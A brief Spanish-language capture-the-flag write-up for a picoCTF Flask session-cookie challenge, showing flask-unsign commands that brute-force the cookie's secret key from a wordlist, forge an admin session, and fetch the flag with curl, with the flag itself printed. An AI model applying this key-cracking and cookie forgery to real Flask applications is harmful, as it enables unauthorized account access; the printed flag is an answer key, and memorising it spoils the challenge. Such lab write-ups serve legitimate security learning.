- #### **Reto** 
ipción** 
Bueno, ya basta de usar mi propio cifrado. ¡Las cookies de sesión de Flask deberían ser muy seguras! [server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)

**Pista**
¿Qué tan segura es una cookie de Flask?
#### - **Solución** 
(.venv) richi@RicardoMedina:~$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-9u9w.ebwYoGaxW0NJkTRZYkYBGu4eTAY" --wordlist co
okies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
(.venv) richi@RicardoMedina:~$ flask-unsign --sign --cookie "{'very_auth': '
admin'}" --secret "peanut butter"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-9vZw.rP0idqfB1SumxxaUwjN8rLY9Ut8
(.venv) richi@RicardoMedina:~$ curl -s http://mercury.picoctf.net:53700/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-9vZw.rP0idqfB1SumxxaUwjN8rLY9Ut8" | grep pico
            Flag<code>picoCTF{pwn_4ll_th3_cook1E5_3646b931}

picoCTF{pwn_4ll_th3_cook1E5_3646b931}